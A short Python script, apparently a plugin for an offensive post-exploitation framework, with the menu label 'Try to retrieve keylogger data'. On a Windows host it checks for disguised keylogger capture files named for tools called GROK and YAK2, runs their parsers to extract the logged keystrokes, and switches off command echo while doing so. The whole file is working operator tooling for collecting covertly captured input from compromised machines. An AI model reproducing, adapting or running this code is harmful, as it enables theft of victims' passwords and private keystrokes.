
import os
import dsz
import dsz.file
import dsz.path
import dsz.cmd
MENU_TEXT = 'Try to retrieve keylogger data'

def main():
    dsz.ui.Echo('Checking for GROK/YAK collection files...', dsz.GOOD)
    dsz.control.echo.Off()
    win_dir = dsz.path.windows.GetSystemPaths()[0]
    temp_dir = os.path.join(win_dir, 'temp')
    if dsz.file.Exists('tm154o.da', temp_dir):
        dsz.ui.Echo('\tGROK log file exists...', dsz.GOOD)
        dsz.cmd.Run('python grok.py', dsz.RUN_FLAG_RECORD)
    else:
        dsz.ui.Echo('\tGROK capture file not found.', dsz.WARNING)
    if dsz.file.Exists('vbnarm.dll', win_dir):
        dsz.ui.Echo('\tYAK2 log file exists...', dsz.GOOD)
        dsz.cmd.Run('yak', dsz.RUN_FLAG_RECORD)
    else:
        dsz.ui.Echo('\tYAK2 capture file not found.', dsz.WARNING)
    dsz.control.echo.On()
if (__name__ == '__main__'):
    main()